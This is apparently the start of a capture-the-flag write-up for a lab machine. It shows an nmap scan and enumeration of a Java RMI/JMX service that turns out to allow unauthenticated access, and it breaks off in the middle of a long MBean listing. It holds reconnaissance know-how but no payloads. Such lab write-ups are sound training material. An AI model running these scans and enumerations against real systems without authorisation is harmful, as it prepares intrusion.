
Target : 10.129.234.57

Date : 05/06/2026

```bash
>  echo "10.129.234.57 manage.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.234.57 manage.htb  
>  nmap -Pn -sV -sC -O -p- --min-rate=3000 10.129.234.57
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 70.71% done; ETC: 10:58 (0:00:11 remaining)  
Warning: 10.129.234.57 giving up on port because retransmission cap hit (10).  
Nmap scan report for manage.htb (10.129.234.57)  
Host is up (0.070s latency).  
Not shown: 65530 closed tcp ports (reset)  
PORT      STATE SERVICE    VERSION  
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)  
|_  256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)  
2222/tcp  open  java-rmi   Java RMI  
| rmi-dumpregistry:    
|   jmxrmi  
|     javax.management.remote.rmi.RMIServerImpl_Stub  
|     @127.0.1.1:38657  
|     extends  
|       java.rmi.server.RemoteStub  
|       extends  
|_        java.rmi.server.RemoteObject  
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)  
8080/tcp  open  http       Apache Tomcat 10.1.19  
|_http-open-proxy: Proxy might be redirecting requests  
|_http-favicon: Apache Tomcat  
|_http-title: Apache Tomcat/10.1.19  
33455/tcp open  tcpwrapped  
38657/tcp open  java-rmi   Java RMI  
Device type: general purpose  
Running: Linux 5.X  
OS CPE: cpe:/o:linux:linux_kernel:5  
OS details: Linux 5.0 - 5.14  
Network Distance: 2 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see two `java-rmi` ports `2222/tcp ; 38657/tcp`, which is the "anomaly" here, otherwise `ssh 22/tcp` is open, and `8080 http/tcp` are open which are much more common.

This tells us this Linux box has something to do with this `Java RMI` thing.

The `http` server runs on `Apache Tomcat 10.1.19` and the nmap scan tells us the 
`java rmi 2222/tcp` has `javax.management.remote.rmi.RMIServerImpl_Stub @127.0.1.1:38657` which must mean `38657/tcp` is the remote endpoint running locally on the machine since it's `@127.0.0.1` but that's just a hypothesis.

We'll start with scanning the http server :

```bash
>  curl -sI http://manage.htb:8080/  
  
HTTP/1.1 200    
Content-Type: text/html;charset=UTF-8  
Transfer-Encoding: chunked  
Date: Fri, 05 Jun 2026 09:07:38 GMT
```

We then use `rmg.jar` and `beanshooter.jar` to enumerate the first `java RMI` port, trying to find a way in.

```bash
>  java -jar ~/tools/jmx/rmg.jar enum 10.129.234.57 2222  
  
[+] RMI registry bound names:  
[+]  
[+]     - jmxrmi  
[+]             --> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)  
[+]                 Endpoint: 127.0.1.1:38657  CSF: RMISocketFactory  ObjID: [669172bd:19e96fdb829:-7fff, 5562232838774932010]  
[+]  
[+] RMI server codebase enumeration:  
[+]  
[+]     - The remote server does not expose any codebases.  
[+]  
[+] RMI server String unmarshalling enumeration:  
[+]  
WARNING: Final field bout in class java.io.ObjectOutputStream has been mutated reflectively by class eu.tneitzel.rmg.io.MaliciousOutputStream in unnamed module @6267c3bb (file:/home/vagabond/tools/jmx/rmg.jar)  
WARNING: Use --enable-final-field-mutation=ALL-UNNAMED to avoid a warning  
WARNING: Mutating final fields will be blocked in a future release unless final field mutation is enabled  
[+]     - Server complained that object cannot be casted to java.lang.String.  
[+]       --> The type java.lang.String is unmarshalled via readString().  
[+]       Configuration Status: Current Default  
[+]  
[+] RMI server useCodebaseOnly enumeration:  
[+]  
[+]     - RMI registry uses readString() for unmarshalling java.lang.String.  
[+]       This prevents useCodebaseOnly enumeration from remote.  
[+]  
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):  
[+]  
[+]     - Registry rejected unbind call cause it was not sent from localhost.  
[+]       Vulnerability Status: Non Vulnerable  
[+]  
[+] RMI Security Manager enumeration:  
[+]  
[+]     - Caught Exception containing 'no security manager' during RMI call.  
[+]       --> The server does not use a Security Manager.  
[+]       Configuration Status: Current Default  
[+]  
[+] RMI server JEP290 enumeration:  
[+]  
[+]     - DGC rejected deserialization of java.util.HashMap (JEP290 is installed).  
[+]       Vulnerability Status: Non Vulnerable  
[+]  
[+] RMI registry JEP290 bypass enumeration:  
[+]  
[+]     - RMI registry uses readString() for unmarshalling java.lang.String.  
[+]       This prevents JEP 290 bypass enumeration from remote.  
[+]  
[+] RMI ActivationSystem enumeration:  
[+]  
[+]     - Caught NoSuchObjectException during activate call (activator not present).  
[+]       Configuration Status: Current Default

>  java -jar ~/tools/jmx/beanshooter.jar enum 10.129.234.57 2222  
  
[+] Checking available bound names:  
[+]  
[+]     * jmxrmi (JMX endpoint: 127.0.1.1:38657)  
[+]  
[+] Checking for unauthorized access:  
[+]  
[+]     - Remote MBean server does not require authentication.  
[+]       Vulnerability Status: Vulnerable  
[+]  
[+] Checking pre-auth deserialization behavior:  
[+]  
[+]     - Remote MBeanServer rejected the payload class.  
[+]       Vulnerability Status: Non Vulnerable  
[+]  
[+] Checking available MBeans:  
[+]  
[+]     - 202 MBeans are currently registred on the MBean server.  
[+]       Listing 180 non default MBeans:  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/host-manager)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/manager,name=RemoteAddrValve)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=HostManager,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=GlobalRequestProcessor,name="http-nio-8080")  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=default,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.RoleMBean (Users:type=Role,rolename="role1",database=UserDatabase)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest22)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest1)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/manager)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=SessionExample,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/host-manager,name=Cache)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=RequestHeaderExample,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest24)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/manager,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/host-manager,name=StandardContextValve)  
[+]       - org.apache.catalina.mbeans.ServiceMBean (Catalina:type=Service)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=jsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest36)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/docs,name=NonLoginAuthenticator)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest10)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest19)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/manager,name=jsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest38)  
[+]       - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/docs,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest3)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest20)  
[+]       - jdk.management.jfr.FlightRecorderMXBeanImpl (jdk.management.jfr:type=FlightRecorder) (action: recorder)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest32)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/examples)  
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=minExemptions)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/docs)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=StringCache)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=simpleimagepush,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.UserMBean (Users:type=User,username="admin",database=UserDatabase)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/host-manager)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest14)  
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/)  
[+]       - org.apache.catalina.mbeans.ClassNameMBean (Catalina:type=ThreadPool,name="http-nio-8080")  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest26)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/manager,name=CSRF,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:type=Engine)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/docs,name=jsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=jsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest27)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest28)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Request Dumper Filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Mapper)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=RequestParamExample,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.RoleMBean (Users:type=Role,rolename="admin-gui",database=UserDatabase)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/examples)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=HTTP header security filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Realm,realmPath=/realm0/realm0)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/examples,name=jsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/examples,name=RemoteAddrValve)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest13)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=MBeanFactory)  
[+]       - com.sun.management.internal.HotSpotDiagnostic (com.sun.management:type=HotSpotDiagnostic) (action: hotspot)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest41)  
[+]       - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ProtocolHandler,port=8080)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,name=StandardEngineValve)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/docs)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest12)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=CookieExample,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest33)  
[+]       - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/examples,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=RequestInfoExample,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/manager)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest40)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/manager,name=StandardContextValve)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/examples)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/docs,name=default,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest29)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Compression Filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest34)  
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/docs)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=Status,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest11)  
[+]       - org.apache.catalina.mbeans.UserMBean (Users:type=User,username="manager",database=UserDatabase)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=JMXProxy,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=HTMLManager,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=numberwriter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/host-manager)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/manager,name=HTTP header security filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest35)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/manager)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest2)  
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=name3)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest21)  
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/examples)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/examples,name=Cache)  
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=stock,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/name1)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=ServletToJsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/docs,name=StandardContextValve)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest25)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=HTMLHostManager,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/docs,name=RemoteAddrValve)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async1,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=default,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async0,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest9)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Realm,realmPath=/realm0)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async3,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async2,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/manager)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Deployer,host=localhost)  
[+]       - org.apache.catalina.mbeans.ContextResourceMBean (Catalina:type=Resource,resourcetype=Global,class=org.apache.catalina.UserDatabase,name="UserDatabase")  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=Manager,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest4)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/host-manager)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/host-manager,name=BasicAuthenticator)  
[+]       - org.apache.catalina.mbeans.MemoryUserDatabaseMBean (Users:type=UserDatabase,database=UserDatabase) (action: tomcat)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Timing Filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=UtilityExecutor)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/,name=default,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=CompressionFilterTestServlet,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ConnectorMBean (Catalina:type=Connector,port=8080)  
[+]       - org.apache.catalina.mbeans.RoleMBean (Users:type=Role,rolename="manage-gui",database=UserDatabase)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest37)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest42)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=CSRF,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/manager,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=ErrorReportValve)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest31)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/examples)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:type=Host,host=localhost)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/host-manager,name=jsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/docs,name=jsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/examples,name=FormAuthenticator)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest43)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=default,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/manager,name=BasicAuthenticator)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest15)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/examples,name=StandardContextValve)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest6)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest30)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=AccessLogValve)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/,name=jsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/manager)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/manager,name=Cache)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/docs,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/,name=jsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest39)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/host-manager)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=StandardHostValve)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/host-manager,name=RemoteAddrValve)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=HTTP header security filter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest8)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/docs)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/,name=Cache)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest44)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest5)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest16)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=SocketProperties,name="http-nio-8080")  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=bytecounter,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/docs,name=Cache)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/docs)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest17)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=HelloWorldExample,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest18)  
[+]       - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/host-manager,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Server)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=jsp,J2EEApplication=none,J2EEServer=none)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/,name=StandardContextValve)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest7)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/,name=NonLoginAuthenticator)  
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/name4)  
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=RequestProcessor,worker="http-nio-8080",name=HttpRequest23)  
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=responsetrailer,J2EEApplication=none,J2EEServer=none)  
